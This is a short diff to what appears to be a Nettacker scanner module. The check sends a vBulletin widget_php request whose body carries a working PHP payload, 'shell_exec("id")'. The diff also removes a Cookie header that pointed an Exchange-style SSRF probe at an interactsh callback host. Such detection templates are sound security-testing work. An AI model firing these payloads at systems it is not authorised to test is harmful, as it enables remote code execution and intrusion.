@@ -23,7 +23,6 @@ payloads:
       - method: post
         headers:
           User-Agent: "{user_agent}"
-          Cookie: "X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;"
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/ajax/render/widget_tabbedcontainer_tab_panel"
@@ -38,7 +37,7 @@ payloads:
                 - 80
                 - 443
           data:
-            "subWidgets[0][template]": 'widget_php'
+            "subWidgets[0][template]": "widget_php"
             "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;'
         response:
           condition_type: and
